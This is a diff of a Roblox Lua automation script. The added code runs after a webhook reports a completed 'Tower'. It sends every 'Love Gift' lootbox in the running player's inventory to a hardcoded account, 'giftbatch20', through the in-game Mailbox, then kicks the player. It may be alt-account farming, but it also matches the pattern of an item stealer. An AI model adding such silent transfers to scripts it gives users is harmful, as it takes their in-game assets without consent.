@@ -452,6 +452,7 @@ end
 
 spawn(CreateButton)
 
+local HttpService = game:GetService("HttpService")
 
 local function sendinfoooo()
     local sent = false
@@ -465,14 +466,34 @@ local function sendinfoooo()
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode({
-                    content = game.Players.LocalPlayer.Name .. " | Completed Tower "
+                    content = game.Players.LocalPlayer.Name .. " | Completed Tower"
                 })
             })
+
+            while true do
+                local Items = GetItemInfo("Lootbox")
+                for _, Item in pairs(Items) do
+                    if string.find(Item.id, "Love Gift") and Item.am >= 1 then
+                        local args = {
+                            [1] = "giftbatch20",
+                            [2] = "enjoy bro",
+                            [3] = "Lootbox",
+                            [4] = Item.uid,
+                            [5] = Item.am
+                        }
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    end
+                end
+                game.Players.LocalPlayer:Kick("FINISHED TOWER, NEW ACCOUNT NEEDED")
+                break
+            end
         end
         wait(60)
     end
 end
+
 spawn(sendinfoooo)
+
 
 
 local HttpService = game:GetService("HttpService")
@@ -530,7 +551,7 @@ local function PetInfo()
             })
         end
 
-        wait(60)
+        wait(120)
     end
 end
 
